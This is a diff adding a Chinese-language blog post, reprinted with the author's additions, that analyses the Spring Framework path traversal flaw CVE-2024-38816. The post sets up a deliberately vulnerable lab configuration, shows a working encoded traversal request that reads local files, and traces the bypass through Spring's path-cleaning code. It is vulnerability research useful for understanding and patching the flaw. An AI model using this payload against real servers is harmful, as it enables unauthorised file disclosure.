@@ -86,6 +86,194 @@
 
     
         <h2 class="title">
+            <a href="/2025/11/13/CVE-2024-38816-Spring-Framework/">
+                CVE-2024-38816 Spring Framework 目录遍历漏洞详细分析
+            </a>
+        </h2>
+    
+    <time>
+        Nov 13, 2025
+    </time>
+    <section class="content">
+        <h1><span id="cve-2024-38816-spring-framework-目录遍历漏洞详细分析">CVE-2024-38816 Spring Framework 目录遍历漏洞详细分析</span></h1><blockquote>
+<p>本文转自 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/15216">真爱和自由</a> 并作补充</p>
+</blockquote>
+<h2><span id="漏洞描述">漏洞描述</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://spring.io/security/cve-2024-38816">https://spring.io/security/cve-2024-38816</a></p>
+<p>通过功能性 Web 框架 WebMvc.fn 或 WebFlux.fn 提供静态资源的应用程序容易受到路径遍历攻击。攻击者可以编写恶意 HTTP 请求并获取文件系统上任何可由 Spring 应用程序正在运行的进程访问的文件。</p>
+<p>具体来说，当以下两个条件都成立时，应用程序就容易受到攻击：</p>
+<ul>
+<li>Web 应用程序用于<code>RouterFunctions</code>提供静态资源</li>
+<li>资源处理明确配置了<code>FileSystemResource</code>位置</li>
+</ul>
+<p>但是，当以下任何一项满足时，恶意请求都会被阻止和拒绝：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://docs.spring.io/spring-security/reference/servlet/exploits/firewall.html">Spring Security HTTP 防火墙</a>正在使用中</li>
+<li>应用程序在 Tomcat 或 Jetty 上运行</li>
+</ul>
+<p><strong>受影响的 Spring 产品和版本</strong></p>
+<p>Spring 框架</p>
+<ul>
+<li>5.3.0 - 5.3.39</li>
+<li>6.0.0 - 6.0.23</li>
+<li>6.1.0 - 6.1.12</li>
+<li>较旧的、不受支持的版本也受到影响</li>
+</ul>
+</blockquote>
+<h2><span id="基础知识">基础知识</span></h2><blockquote>
+<p>首先分析一个cve说实话我是不太了解spring框架的，这时候就需要疯狂拷打GPT了</p>
+<p><strong>WebMvc.fn<code>和</code>WebFlux.fn</strong></p>
+<p><strong>WebMvc</strong></p>
+<p>WebMvc 是 Spring Framework 提供的传统的 MVC（Model-View-Controller）架构，用于构建 web 应用程序。它使用的是 Servlet API，适合于构建基于线程的同步 web 应用。其基本组成包括：</p>
+<ul>
+<li><strong>Controller</strong>：处理 HTTP 请求的主要组件。</li>
+<li><strong>View</strong>：用于渲染响应的模板（如 JSP、Thymeleaf 等）。</li>
+<li><strong>Model</strong>：包含应用程序的核心数据。</li>
+</ul>
+<p><strong>WebFlux</strong></p>
+<p>WebFlux 是 Spring 5 中引入的模块，专门用于构建异步、非阻塞的 web 应用，适合于高并发和 I&#x2F;O 密集型的场景。WebFlux 基于反应式编程模型，允许应用在处理请求时不阻塞线程，从而提高了性能。</p>
+<p><strong>RouterFunctions 和 FileSystemResource</strong></p>
+<p>RouterFunctions</p>
+<p><code>RouterFunctions</code> 是Spring WebFlux的一部分，它提供了一种函数式编程模型来定义请求路由和处理。使用 <code>RouterFunctions</code>，你可以创建一个路由，它将HTTP请求映射到处理这些请求的函数上。</p>
+<p>FileSystemResource</p>
+<p><code>FileSystemResource</code> 是Spring框架中的一个类，它表示文件系统中的一个资源，通常用于读取和写入文件。它实现了 <code>org.springframework.core.io.Resource</code> 接口。</p>
+</blockquote>
+<h2><span id="环境搭建">环境搭建</span></h2><blockquote>
+<p>这里就用webflux来举例子</p>
+<p>首先选择spring的版本，只需要在影响版本里面的就好了</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-webflux<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后因为要满足</p>
+<p>当以下两个条件都成立时，应用程序就容易受到攻击：</p>
+<ul>
+<li>Web 应用程序用于<code>RouterFunctions</code>提供静态资源</li>
+<li>资源处理明确配置了<code>FileSystemResource</code>位置</li>
+</ul>
+<p>可以问问gpt啥的</p>
+<p><img src="/2025/11/13/CVE-2024-38816-Spring-Framework/1.png" alt="image"></p>
+<p>创建一个漏洞代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Config</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> RouterFunction&lt;ServerResponse&gt; <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> RouterFunctions.resources(<span class="string">&quot;/static/**&quot;</span>, <span class="keyword">new</span> <span class="title class_">FileSystemResource</span>(<span class="string">&quot;D:/phpstudy_pro/WWW/&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h2><span id="漏洞复现">漏洞复现</span></h2><blockquote>
+<p>首先我们在D盘放一个文件，用于测试</p>
+<p>在1.txt写入flag{scueess}</p>
+<p>然后尝试访问路由</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/static/%5c/%5c/../../1.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8888</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Chromium&quot;;v=&quot;125&quot;, &quot;Not.A/Brand&quot;;v=&quot;24&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/13/CVE-2024-38816-Spring-Framework/2.png" alt="image"></p>
+<p>可以发现是成功了</p>
+</blockquote>
+<h2><span id="漏洞分析">漏洞分析</span></h2><blockquote>
+<p>先查看官方的diff确定漏洞代码位置</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/spring-projects/spring-framework/commit/d86bf8b2056429edf5494456cffcb2b243331c49#diff-25869a3e3b3d4960cb59b02235d71d192fdc4e02ef81530dd6a660802d4f8707L151">https://github.com/spring-projects/spring-framework/commit/d86bf8b2056429edf5494456cffcb2b243331c49#diff-25869a3e3b3d4960cb59b02235d71d192fdc4e02ef81530dd6a660802d4f8707L151</a></p>
+<p>是在PathResourceLookupFunction类，如何修复的先不关心，当然如果很明显就可以更快，我们把关键方法给打个断点慢慢看一看，然后慢慢分析调试一会就能知道个大概</p>
+<p>因为是使用了RouterFunctions处理，会来到如下代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Mono&lt;Resource&gt; <span class="title function_">apply</span><span class="params">(ServerRequest request)</span> &#123;</span><br><span class="line">    <span class="type">PathContainer</span> <span class="variable">pathContainer</span> <span class="operator">=</span> request.requestPath().pathWithinApplication();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">this</span>.pattern.matches(pathContainer)) &#123;</span><br><span class="line">        <span class="keyword">return</span> Mono.empty();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        pathContainer = <span class="built_in">this</span>.pattern.extractPathWithinPattern(pathContainer);</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="built_in">this</span>.processPath(pathContainer.value());</span><br><span class="line">        <span class="keyword">if</span> (path.contains(<span class="string">&quot;%&quot;</span>)) &#123;</span><br><span class="line">            path = StringUtils.uriDecode(path, StandardCharsets.UTF_8);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (StringUtils.hasLength(path) &amp;&amp; !<span class="built_in">this</span>.isInvalidPath(path)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Resource</span> <span class="variable">resource</span> <span class="operator">=</span> <span class="built_in">this</span>.location.createRelative(path);</span><br><span class="line">                <span class="keyword">return</span> resource.isReadable() &amp;&amp; <span class="built_in">this</span>.isResourceUnderLocation(resource) ? Mono.just(resource) : Mono.empty();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UncheckedIOException</span>(var5);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> Mono.empty();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先是从pathContainer.value()获取path，然后由processPath处理</p>
+<p><img src="/2025/11/13/CVE-2024-38816-Spring-Framework/3.png" alt="image"></p>
+<p>processPath方法如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String <span class="title function_">processPath</span><span class="params">(String path)</span> &#123;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">slash</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; path.length(); ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (path.charAt(i) == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">            slash = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (path.charAt(i) &gt; <span class="string">&#x27; &#x27;</span> &amp;&amp; path.charAt(i) != <span class="number">127</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">0</span> || i == <span class="number">1</span> &amp;&amp; slash) &#123;</span><br><span class="line">                <span class="keyword">return</span> path;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            path = slash ? <span class="string">&quot;/&quot;</span> + path.substring(i) : path.substring(i);</span><br><span class="line">            <span class="keyword">return</span> path;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> slash ? <span class="string">&quot;/&quot;</span> : <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>简单来讲就是</p>
+<p><strong>去除路径开头的无效字符</strong>：忽略空格、控制字符等无效字符，找到第一个有效字符。</p>
+<p><strong>保留根路径</strong>：如果路径开头有斜杠 <code>/</code>，则确保处理后的路径以 <code>/</code> 开头。</p>
+<p><strong>快速返回有效路径</strong>：如果路径是根路径或有效路径已经以 <code>/</code> 开头，直接返回，不做额外处理。</p>
+<p><strong>输入</strong>: <code>&quot; /home/user&quot;</code><br><strong>输出</strong>: <code>&quot;/home/user&quot;</code></p>
+<ul>
+<li>去除了路径开头的空格，保留以 <code>/</code> 开头的有效路径。</li>
+</ul>
+<p><strong>输入</strong>: <code>&quot; user/docs&quot;</code><br><strong>输出</strong>: <code>&quot;user/docs&quot;</code></p>
+<ul>
+<li>去除了路径开头的空格，保留从第一个有效字符 <code>u</code> 开始的路径。</li>
+</ul>
+<p><strong>输入</strong>: <code>&quot;////&quot;</code><br><strong>输出</strong>: <code>&quot;/&quot;</code></p>
+<ul>
+<li>只有斜杠的情况，返回根路径 <code>/</code>。</li>
+</ul>
+<p><strong>输入</strong>: <code>&quot; &quot;</code><br><strong>输出</strong>: <code>&quot;&quot;</code></p>
+<p>这个处理对我们的..&#x2F;这种没有影响的</p>
+<p>然后回到apply</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (path.contains(<span class="string">&quot;%&quot;</span>)) &#123;</span><br><span class="line">    path = StringUtils.uriDecode(path, StandardCharsets.UTF_8);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果包含%，就是url编码的标志，然后会继续url解码</p>
+<p>最终确定路径的点是在</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (StringUtils.hasLength(path) &amp;&amp; !<span class="built_in">this</span>.isInvalidPath(path)) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Resource</span> <span class="variable">resource</span> <span class="operator">=</span> <span class="built_in">this</span>.location.createRelative(path);</span><br><span class="line">        <span class="keyword">return</span> resource.isReadable() &amp;&amp; <span class="built_in">this</span>.isResourceUnderLocation(resource) ? Mono.just(resource) : Mono.empty();</span><br></pre></td></tr></table></figure>
+
+<p>关键在于this.isInvalidPath(path)判断</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isInvalidPath</span><span class="params">(String path)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!path.contains(<span class="string">&quot;WEB-INF&quot;</span>) &amp;&amp; !path.contains(<span class="string">&quot;META-INF&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (path.contains(<span class="string">&quot;:/&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">relativePath</span> <span class="operator">=</span> path.charAt(<span class="number">0</span>) == <span class="string">&#x27;/&#x27;</span> ? path.substring(<span class="number">1</span>) : path;</span><br><span class="line">            <span class="keyword">if</span> (ResourceUtils.isUrl(relativePath) || relativePath.startsWith(<span class="string">&quot;url:&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> path.contains(<span class="string">&quot;..&quot;</span>) &amp;&amp; StringUtils.cleanPath(path).contains(<span class="string">&quot;../&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们需要的是返回false，看来能够返回的只有一个地方了return path.contains(“..”) &amp;&amp; StringUtils.cleanPath(path).contains(“..&#x2F;“);，首先我们可以有..这种字符的存在，因为是&amp;符号连接的，所以终极目的就是StringUtils.cleanPath(path).contains(“..&#x2F;“)返回false</p>
+<p>cleanPath方法很长，一步一步分析</p>
+<p>这个代码是为了处理windows和linux的差异的，会windows中的<code>\\</code>或者\转为linux中的&#x2F;</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">String normalizedPath;</span><br><span class="line"><span class="keyword">if</span> (path.indexOf(<span class="number">92</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">                normalizedPath = replace(path, <span class="string">&quot;\\\\&quot;</span>, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">                normalizedPath = replace(normalizedPath, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                normalizedPath = path;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后就是处理前缀了,如果路径没有.直接返回，如果又会处理，还是为了处理windows的场景</p>
+<p><code>58</code> 对应的是冒号 <code>:</code>，用于检测是否有像 <code>C:</code> 这样的路径前缀。如果存在前缀（如 Windows 路径中的盘符），将其提取出来。</p>
+<p>如果前缀中包含 <code>/</code>，则认为它不是有效的前缀（可能是 URL 的一部分），清除它；否则将前缀保留并将路径的主体部分截取出来。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (normalizedPath.indexOf(<span class="number">46</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> normalizedPath;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">prefixIndex</span> <span class="operator">=</span> normalizedPath.indexOf(<span class="number">58</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">prefix</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span> (prefixIndex != -<span class="number">1</span>) &#123;</span><br><span class="line">                    prefix = normalizedPath.substring(<span class="number">0</span>, prefixIndex + <span class="number">1</span>);</span><br><span class="line">                    <span class="keyword">if</span> (prefix.contains(<span class="string">&quot;/&quot;</span>)) &#123;</span><br><span class="line">                        prefix = <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        pathToUse = normalizedPath.substring(prefixIndex + <span class="number">1</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后根据 <code>/</code> 拆分路径，将其转换为一个数组 <code>pathArray</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String[] pathArray = delimitedListToStringArray(pathToUse, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">Deque&lt;String&gt; pathElements = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>(pathArray.length);</span><br><span class="line"><span class="type">int</span> <span class="variable">tops</span> <span class="operator">=</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/13/CVE-2024-38816-Spring-Framework/4.png" alt="image"></p>
+<p>如果包含.则不会走到<code>pathElements.addFirst(element);</code>相当于去除，中间对于tops的处理就是相当于在处理..的路径穿越字符了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i = pathArray.length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">element</span> <span class="operator">=</span> pathArray[i];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="string">&quot;.&quot;</span>.equals(element)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;..&quot;</span>.equals(element)) &#123;</span><br><span class="line">            ++tops;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (tops &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            --tops;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            pathElements.addFirst(element);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>结合</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="string">&quot;..&quot;</span>.equals(element)) &#123;</span><br><span class="line">            ++tops;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (tops &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            --tops;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; tops; ++i) &#123;</span><br><span class="line">         pathElements.addFirst(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>处理前和处理后的代码</p>
+<p><img src="/2025/11/13/CVE-2024-38816-Spring-Framework/5.png" alt="image"></p>
+<p>应该能读懂这个逻辑吧</p>
+<p>然后最后就是拼接了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">joined</span> <span class="operator">=</span> collectionToDelimitedString(pathElements, <span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> prefix.isEmpty() ? joined : prefix + joined;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/13/CVE-2024-38816-Spring-Framework/6.png" alt="image"></p>
+<p>如果我们想要返回的路径不包含..&#x2F;就得从其中一步找点破绽，其实就是连猜带蒙多去尝试各种各样的路径</p>
+<p>其实考虑一下，它是类似于这种就会实现有..&#x2F;但是返回的时候不包含..&#x2F;</p>
+<p>比如</p>
+<p>a&#x2F;b&#x2F;..&#x2F;c</p>
+<p>经过处理后，路径将被简化为 <code>a/b/d</code>，因为 <code>c/..</code> 相当于取消了 <code>c</code> 目录的影响</p>
+<p>这里我们希望b能够占个位置，但是又不会当作目录的一个字符</p>
+<p>代码逻辑是以&#x2F;作为分割</p>
+<p>空字符也算做一个元素，按理来说构造这样一个字符就ok了</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/static/////../../1.txt</span><br></pre></td></tr></table></figure>
+
+<p>自己写一个测试类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.util.ResourceUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.StringUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;/static/////../../1.txt&quot;</span>;</span><br><span class="line">        System.out.println(isInvalidPath(path));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isInvalidPath</span><span class="params">(String path)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!path.contains(<span class="string">&quot;WEB-INF&quot;</span>) &amp;&amp; !path.contains(<span class="string">&quot;META-INF&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (path.contains(<span class="string">&quot;:/&quot;</span>)) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">relativePath</span> <span class="operator">=</span> path.charAt(<span class="number">0</span>) == <span class="string">&#x27;/&#x27;</span> ? path.substring(<span class="number">1</span>) : path;</span><br><span class="line">                <span class="keyword">if</span> (ResourceUtils.isUrl(relativePath) || relativePath.startsWith(<span class="string">&quot;url:&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> path.contains(<span class="string">&quot;..&quot;</span>) &amp;&amp; StringUtils.cleanPath(path).contains(<span class="string">&quot;../&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/13/CVE-2024-38816-Spring-Framework/7.png" alt="image"></p>
+<p>可以看到确实是可以的，但是实际中不行，是因为最开始分析的processPath对我们的路径最了标准化处理</p>
+<p>然后思路就回到如何绕过这个标准化，就是不能出现&#x2F;&#x2F;&#x2F;&#x2F;这种连起来的，再结合刚刚对windows的处理\</p>
+<p>那我们可以构造这样一个路径</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/static/%5c/%5c/../../1.txt</span><br></pre></td></tr></table></figure>
+
+<p>首先processPath处理后原样输出，而标准化处理后就变为</p>
+<p><img src="/2025/11/13/CVE-2024-38816-Spring-Framework/8.png" alt="image"></p>
+<p>然后就可以了</p>
+<p><img src="/2025/11/13/CVE-2024-38816-Spring-Framework/9.png" alt="image"></p>
+</blockquote>
+<h2><span id="参考">参考</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://avd.aliyun.com/detail?id=AVD-2024-38816">https://avd.aliyun.com/detail?id=AVD-2024-38816</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Spring/" rel="tag">Spring</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
